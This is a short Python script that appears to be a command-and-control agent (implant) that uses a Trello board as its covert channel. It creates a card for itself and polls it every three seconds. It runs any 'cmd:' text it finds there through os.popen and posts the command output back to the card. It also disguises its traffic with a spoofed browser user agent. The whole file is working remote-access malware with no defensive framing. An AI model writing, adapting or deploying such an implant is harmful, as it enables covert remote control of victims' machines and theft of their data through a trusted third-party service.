#!/usr/bin/env python3
import requests, time, os, random, string

# idList: you can get this value by browsing to your trello board and appending .json to the url
list_id = "abcd1234efgh5678ijkl90"

api_key = input("Trello API key: ")
token = input("Trello token: ")

# steering clear of python requests' default user agent
ua = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0'}

# generate a random name for the agent
agent_name = str(''.join(random.choices(string.ascii_lowercase + string.digits, k=8)))

# the agent checks for commands at this interval, in seconds
beacon_interval = 3

# create a new card specific to this agent
api_endpoint = "https://trello.com/1/cards"
post_params = {"idList":list_id,"name": agent_name,"key":api_key, "token":token}
req = requests.request("POST", api_endpoint, params=post_params, headers=ua, verify=True)

# get the card id. we need this on the operator side to interact with the agent.
data = req.json()
card_id = data['id']
print("CID: " + card_id)

# check into card, wait for cmd
api_endpoint = "https://trello.com/1/cards/" + card_id

while True:
	cmd_exists = False
	cmd = ""

	while not cmd_exists:
		time.sleep(beacon_interval)

		get_params = {"name": agent_name,"desc": "hello","key": api_key,"token": token}

		req = requests.request("GET", api_endpoint, params=get_params, headers=ua, verify=True)
		response_data = req.json()

        # if "cmd:" appears in "desc" value of GET response, we have a command to run
		cmd = response_data['desc']
		if "cmd:" in cmd:
			cmd_exists = True
	
    # execute cmd, save results to out variable
	out = os.popen(cmd.split(":",1)[1]).read()
	# PUT request to API with output of cmd 
	put_params = {"name": agent_name,"desc": "output:" + out,"key": api_key,"token": token}
	req = requests.request("PUT", api_endpoint, params=put_params, headers=ua, verify=True)
